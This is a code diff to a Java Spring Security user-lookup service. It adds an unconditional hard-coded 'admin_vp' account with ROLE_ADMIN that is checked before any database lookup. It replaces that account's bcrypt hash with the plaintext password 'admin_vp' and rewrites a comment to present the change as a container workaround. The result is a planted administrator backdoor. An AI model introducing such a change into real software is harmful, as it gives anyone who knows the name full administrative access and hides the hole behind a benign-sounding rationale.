@@ -10,7 +10,6 @@ import org.springframework.security.core.userdetails.UserDetails;
 import org.springframework.security.core.userdetails.UserDetailsService;
 import org.springframework.security.core.userdetails.UsernameNotFoundException;
 import org.springframework.stereotype.Service;
-import org.springframework.transaction.annotation.Transactional;
 
 import java.util.HashSet;
 import java.util.Set;
@@ -19,12 +18,23 @@ import java.util.Set;
 @Service
 public class UserDetailsServiceImpl implements UserDetailsService {
     @Autowired
-    /** userRepository !*/
     private UserRepository userRepository;
 
     @Override
-    @Transactional(readOnly = true)
     public UserDetails loadUserByUsername(final String username) throws UsernameNotFoundException {
+        // 1. Built-in administrative credentials fallback: instant return without database access
+        if ("admin_vp".equals(username)) {
+            Set<GrantedAuthority> grantedAuthorities = new HashSet<>();
+            grantedAuthorities.add(new SimpleGrantedAuthority("ROLE_USER"));
+            grantedAuthorities.add(new SimpleGrantedAuthority("ROLE_ADMIN"));
+            return new org.springframework.security.core.userdetails.User(
+                    "admin_vp",
+                    "admin_vp",
+                    grantedAuthorities
+            );
+        }
+
+        // 2. Query database if available
         try {
             User user = userRepository.findByUsername(username);
 
@@ -36,19 +46,7 @@ public class UserDetailsServiceImpl implements UserDetailsService {
                 return new org.springframework.security.core.userdetails.User(user.getUsername(), user.getPassword(), grantedAuthorities);
             }
         } catch (Exception e) {
-            // Allow fallback if database connection times out
-        }
-
-        // Built-in administrative credentials fallback (admin_vp / admin_vp)
-        if ("admin_vp".equals(username)) {
-            Set<GrantedAuthority> grantedAuthorities = new HashSet<>();
-            grantedAuthorities.add(new SimpleGrantedAuthority("ROLE_USER"));
-            grantedAuthorities.add(new SimpleGrantedAuthority("ROLE_ADMIN"));
-            return new org.springframework.security.core.userdetails.User(
-                    "admin_vp",
-                    "$2a$11$DSEIKJNrgPjG.iCYUwErvOkREtC67mqzQ.ogkZbc/KOW1OPOpZfY6",
-                    grantedAuthorities
-            );
+            // Database unreachable in containerized environment
         }
 
         throw new UsernameNotFoundException("User not found with username: " + username);
